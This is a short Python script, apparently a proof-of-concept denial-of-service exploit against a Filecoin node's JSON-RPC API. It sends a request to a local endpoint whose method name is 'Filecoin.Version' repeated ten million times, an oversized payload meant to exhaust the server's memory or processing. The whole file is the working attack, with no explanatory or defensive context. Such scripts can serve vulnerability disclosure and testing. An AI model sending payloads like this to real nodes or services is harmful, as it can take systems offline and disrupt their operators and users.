#!/usr/bin/python3

import requests
URL = "http://127.0.0.1:18888/v0"

data = {
	"jsonrpc" : "2.0",
	"method" : "Filecoin.Version" * 10000000,
	"params" : [],
	"id" : 0
}

response = requests.post(url = URL, json = data)
print(response)

